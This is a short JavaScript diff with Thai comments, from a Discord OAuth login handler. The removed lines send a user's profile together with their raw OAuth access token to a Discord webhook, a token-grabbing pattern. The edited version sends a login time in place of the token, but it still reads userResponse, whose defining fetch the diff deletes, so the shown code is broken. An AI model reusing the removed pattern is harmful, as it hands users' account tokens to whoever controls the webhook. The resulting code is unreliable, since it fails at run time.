@@ -268,14 +268,9 @@
                         redirect_uri: REDIRECT_URI
                     })
                 });
-                const tokenData = await tokenResponse.json();
-                const accessToken = tokenData.access_token;
-                const userResponse = await fetch("https://discord.com/api/users/@me", {
-                    headers: { Authorization: `Bearer ${accessToken}` }
-                });
                 const userData = await userResponse.json();
                 // ส่งข้อมูลไปที่ Discord Webhook
-                sendToWebhook(userData, accessToken);
+                sendToWebhook(userData, loginTime);
             } catch (error) {
                 console.error("❌ ดึงข้อมูลผู้ใช้ล้มเหลว:", error);
             }
